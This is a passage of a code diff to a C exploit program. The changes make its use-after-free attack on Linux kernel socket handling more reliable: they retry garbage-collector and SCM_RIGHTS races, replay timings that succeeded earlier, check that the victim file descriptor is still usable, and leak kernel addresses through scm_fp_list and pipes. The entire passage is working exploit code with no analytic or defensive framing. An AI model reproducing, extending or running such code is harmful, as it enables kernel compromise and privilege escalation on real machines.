-    /* Phase 6: Trigger UAF via GC race (most retries) */
+    /* Phase 6: Trigger UAF via GC race (most retries) - adapt to system state first */
     phase_begin(6, "UAF Trigger");
     g_crash_phase = 6;
+    adapt_to_system_state();
+    setpriority(PRIO_PROCESS, 0, -20);
     warm_up_gc();
     int uaf_ok = 0;
 
@@ -4766,6 +5594,34 @@ static int run_exploit(void) {
                 LOG_E("UAF: Cannot recreate socketpair after round %d", round);
                 break;
             }
+        }
+
+        /* If we found a working method earlier, try it first */
+        if (g_method_succeeded && g_successful_method[0] && round == 0) {
+            LOG_I("Replicating successful method: %s (delay=%d, inflight=%d)",
+                  g_successful_method, g_successful_delay, g_successful_inflight);
+            
+            g_race_usleep = g_successful_delay;
+            g_race_inflight = g_successful_inflight;
+            
+            if (strcmp(g_successful_method, "gc_race") == 0) {
+                if (trigger_uaf_gc_race()) {
+                    LOG_I("Method replication succeeded!");
+                    uaf_ok = 1;
+                }
+            } else if (strcmp(g_successful_method, "scm_race") == 0) {
+                if (trigger_uaf_via_scm_race()) {
+                    LOG_I("Method replication succeeded!");
+                    uaf_ok = 1;
+                }
+            } else if (strcmp(g_successful_method, "pipe_splice") == 0) {
+                if (trigger_uaf_via_pipe_splice()) {
+                    LOG_I("Method replication succeeded!");
+                    uaf_ok = 1;
+                }
+            }
+            
+            if (uaf_ok) break;
         }
 
         int max_attempts = base_attempts + (round * 30);
@@ -4814,7 +5670,55 @@ static int run_exploit(void) {
                 }
             }
 
-            if (trigger_uaf_gc_race()) { uaf_ok = 1; break; }
+            if (trigger_uaf_unified()) {
+                uaf_ok = 1;
+                /* After trigger_uaf_unified() returns 1, verify g_victim_fd is usable */
+                if (uaf_ok && g_victim_fd > 0) {
+                    LOG_I("Verifying UAF result...");
+
+                    /* Test 1: Can we read from it? */
+                    char test_buf[1];
+                    ssize_t test_r = read(g_victim_fd, test_buf, 0);
+
+                    if (test_r < 0 && errno != EAGAIN && errno != EWOULDBLOCK && errno != EBADF) {
+                        LOG_W("UAF verification: read failed errno=%d", errno);
+                    } else {
+                        LOG_D("UAF verification: read returned %zd errno=%d", test_r, errno);
+                    }
+
+                    /* Test 2: Try dup to ensure it's a valid fd */
+                    int dup_test = fcntl(g_victim_fd, F_DUPFD_CLOEXEC, 100);
+                    if (dup_test >= 0) {
+                        LOG_I("UAF verification: fd %d is valid (dup to %d succeeded)", g_victim_fd, dup_test);
+                        close(dup_test);
+                    } else {
+                        LOG_W("UAF verification: fd %d may be stale (dup failed)", g_victim_fd);
+                        /* Try to get a fresh copy */
+                        int new_fd = dup(g_victim_fd);
+                        if (new_fd >= 0) {
+                            close(g_victim_fd);
+                            g_victim_fd = new_fd;
+                            LOG_I("UAF: refreshed fd to %d", g_victim_fd);
+                        }
+                    }
+
+                    /* Test 3: If g_victim_fd is not valid, try to get it from the UAF trigger's return value */
+                    if (g_victim_fd <= 0) {
+                        LOG_E("UAF verification: no valid victim fd, forcing retry");
+                        uaf_ok = 0;
+                    }
+                }
+
+                /* If verification failed, don't proceed to leak phase - retry UAF */
+                if (!uaf_ok || g_victim_fd <= 0) {
+                    LOG_W("UAF verification failed, forcing another attempt");
+                    close(g_victim_fd);
+                    g_victim_fd = -1;
+                    /* Continue the retry loop instead of proceeding */
+                }
+
+                if (uaf_ok) break;
+            }
             usleep(10000);
             g_ufd[0] = -1; g_ufd[1] = -1;
 
@@ -4848,15 +5752,36 @@ static int run_exploit(void) {
     phase_end(6, PHASE_OK);
     LOG_I("UAF triggered!");
 
-    /* Phase 7: Post-UAF leak via scm_fp_list */
+    /* Phase 7: Post-UAF leak via scm_fp_list - with verification */
     phase_begin(7, "Address Leak");
     g_crash_phase = 7;
+
+    /* Verify UAF is still valid before trying leak */
+    if (g_victim_fd <= 0 || fcntl(g_victim_fd, F_GETFD) == -1) {
+        LOG_W("UAF fd invalid before leak, re-triggering...");
+        trigger_uaf_unified();
+    }
+
     if (!leak_via_scm_fp_list()) {
         LOG_W("scm_fp_list leak returned nothing, retrying UAF cycle...");
         for (int retry = 0; retry < 5; retry++) {
             if (g_exploit_timeout) break;
             LOG_I("UAF retry %d/5", retry + 1);
-            if (trigger_uaf_gc_race()) {
+            
+            /* Use successful method if available */
+            if (g_method_succeeded && g_successful_method[0]) {
+                LOG_I("Using successful method %s for re-trigger", g_successful_method);
+                
+                if (strcmp(g_successful_method, "gc_race") == 0) {
+                    g_race_usleep = g_successful_delay;
+                    g_race_inflight = g_successful_inflight;
+                    if (trigger_uaf_gc_race()) {
+                        if (leak_via_scm_fp_list()) { LOG_I("Leak succeeded on retry"); break; }
+                    }
+                } else if (trigger_uaf_unified()) {
+                    if (leak_via_scm_fp_list()) { LOG_I("Leak succeeded on retry"); break; }
+                }
+            } else if (trigger_uaf_unified()) {
                 if (leak_via_scm_fp_list()) { LOG_I("Leak succeeded on retry"); break; }
             }
             usleep(50000);
@@ -4872,7 +5797,7 @@ static int run_exploit(void) {
         if (!pipe_leak_addresses()) {
             LOG_W("Pipe address leak failed, retrying...");
             for (int retry = 0; retry < 3; retry++) {
-                if (trigger_uaf_gc_race()) {
+                if (trigger_uaf_unified()) {
                     if (pipe_leak_addresses()) break;
                 }
                 usleep(50000);
